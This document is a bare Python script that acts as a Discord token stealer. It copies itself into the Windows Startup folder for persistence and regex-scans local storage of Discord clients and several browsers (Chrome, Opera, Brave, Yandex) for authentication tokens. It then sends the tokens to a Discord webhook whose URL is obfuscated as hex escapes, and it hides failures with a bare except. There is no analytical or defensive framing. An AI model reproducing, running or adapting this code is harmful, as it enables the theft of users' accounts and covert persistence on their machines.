import os
import re
import json
from urllib.request import Request, urlopen
import shutil
import sys

current_file = sys.argv[0]
current_file_path = os.path.abspath(current_file)

startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

shutil.copy2(current_file_path, startup_folder)
def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    WEBHOOK_URLS = [
        '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x77\x65\x62\x68\x6f\x6f\x6b\x73\x2f\x31\x31\x37\x30\x34\x36\x37\x34\x33\x32\x32\x33\x34\x37\x34\x35\x38\x35\x36\x2f\x43\x46\x67\x78\x77\x61\x53\x5f\x62\x53\x35\x6d\x76\x41\x30\x64\x72\x75\x31\x51\x58\x43\x5f\x70\x77\x59\x5f\x72\x69\x53\x54\x77\x57\x69\x33\x38\x51\x4b\x47\x55\x56\x6c\x4c\x48\x36\x44\x53\x48\x71\x43\x2d\x6f\x58\x4e\x70\x79\x2d\x41\x38\x35\x46\x30\x43\x68\x36\x73\x41\x67'    ]  
    PING_ME = False

    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        for webhook_url in WEBHOOK_URLS:
            req = Request(webhook_url, data=payload.encode(), headers=headers)
            urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()